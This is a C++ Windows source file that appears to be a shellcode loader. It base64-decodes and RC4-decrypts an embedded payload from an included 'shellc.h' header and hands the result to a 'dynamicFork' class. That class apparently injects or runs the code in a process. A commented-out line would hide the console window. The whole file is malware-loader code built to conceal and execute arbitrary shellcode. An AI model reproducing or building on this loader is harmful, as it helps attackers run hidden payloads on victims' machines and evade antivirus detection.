#include <Windows.h>
#include <iostream>
#include "rc4Algorithm.h"
#include "shellc.h"
#include <fstream>
#include "dynamicFork.h"


#define sizeOfArray(arr) (sizeof(arr)/sizeof(arr[0]))
#define ENC_DATA_SIZE (sizeOfArray(encData))


#pragma comment(lib, "Crypt32.lib")

std::pair<char*, DWORD> decryptData(unsigned char encBufferInput[], const char* key)  {
	DWORD *decodedSize = new DWORD();
	CryptStringToBinaryA((char*)encBufferInput, ENC_DATA_SIZE, CRYPT_STRING_BASE64, NULL, decodedSize, NULL, NULL);

	char* decodedBuffer = new char[*decodedSize]();

	CryptStringToBinaryA((char*)encBufferInput, ENC_DATA_SIZE, CRYPT_STRING_BASE64, (BYTE*)decodedBuffer, decodedSize, NULL, NULL);

	rc4Algorithm rc4;

	char* decryptedBufferOutput = new char[*decodedSize]();

	rc4.crypt(decodedBuffer, key, strlen(key), *decodedSize, decryptedBufferOutput);

	delete[] decodedBuffer;

	return std::make_pair(decryptedBufferOutput, *decodedSize);

}


int main(int argc, char* argv[]) {

	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	std::pair <char*, DWORD> decOut;
	decOut = decryptData(encData, key);

	dynamicFork dyn(decOut.first);
	
	/*for (int i = 0; i < decOut.second; i++) {
		printf("%02hhX ", decOut.first[i]);
	}

	*/

	return 0;
}